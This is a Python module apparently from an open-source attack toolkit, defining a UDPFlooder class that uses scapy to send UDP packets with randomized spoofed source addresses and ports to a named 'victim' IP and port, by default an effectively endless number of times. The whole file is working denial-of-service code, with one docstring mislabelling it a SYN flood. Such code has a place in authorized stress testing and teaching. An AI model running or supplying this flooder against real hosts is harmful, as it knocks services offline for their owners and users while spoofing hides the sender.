#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>
"""The module for UDP flood class"""


import sys
import logging
from scapy.all import IP, UDP, send  # pylint: disable=E0401,E0611

from .helpers import (
    random_IP,
    random_port,
    validate_ip_address,
    validate_port,
    progress_bar,
    get_description_from_wiki,
)


_LOGGER = logging.getLogger(__name__)


class UDPFlooder:  # pylint: disable=R0903
    """A class that represents a UDP flood attack"""

    def __init__(self, dst_ip, dst_port, count=None):
        """
        Initialaze a UDP flood object

        :dst_ip: the victim's IP
        :dst_port: the victim's port
        """
        self.dst_ip = validate_ip_address(dst_ip)
        self.dst_port = validate_port(dst_port)
        if count is None:
            self.count = 9_223_372_036_854_775_807
        else:
            self.count = int(count)
        if dst_ip and dst_port and count:
            _LOGGER.debug(
                "Creating a UDPFlooder object with destination IP %s"
                " and destination port %i",
                self.dst_ip,
                self.dst_port,
            )
        description = get_description_from_wiki("UDP flood")
        if "does not match any pages" in description:
            _LOGGER.error(description)
            sys.exit(1)
        self.description = description

    def _create_ip_packet(self):
        """
        Create an IP packet with random source IP

        :return: scapy IP object
        """
        IP_Packet = IP()  # pylint: disable=C0103
        IP_Packet.src = random_IP()
        IP_Packet.dst = self.dst_ip
        return IP_Packet

    def _create_udp_packet(self):
        """
        Create a UDP packet with random source port

        :return: scapy UDP packet
        """
        UDP_Packet = UDP()  # pylint: disable=C0103
        UDP_Packet.sport = random_port()
        UDP_Packet.dport = self.dst_port
        return UDP_Packet

    def run(self):
        """
        Run the SYN flood attack until KeyboardInterrupt
        or the number of all packets is sent
        """
        total = 0
        _LOGGER.info(
            "Trying to send %i packets. Press Ctrl+C to "
            "stop before all the packets will be sent",
            self.count,
        )

        for x in range(0, self.count):  # pylint: disable=C0103
            try:
                # Ether_Frame = Ether()
                # Ether_Frame.scr = randomMAC()
                IP_Packet = self._create_ip_packet()  # pylint: disable=C0103
                UDP_Packet = self._create_udp_packet()  # pylint: disable=C0103
                send(IP_Packet / UDP_Packet, verbose=0)
                _LOGGER.debug(
                    "Sending a packet #%i with <source_IP>:<source_port>"
                    " %s:%s",
                    x + 1,
                    IP_Packet.src,
                    UDP_Packet.sport,
                )
                progress_bar(x, self.count)
                total += 1
            except KeyboardInterrupt:
                _LOGGER.info("\nTotal packets sent: %i\n", total)
                _LOGGER.warning("\nStopping UDP flood attack")
                sys.exit(0)

        progress_bar(self.count, self.count)
        _LOGGER.info("\nTotal packets sent: %i\n", total)
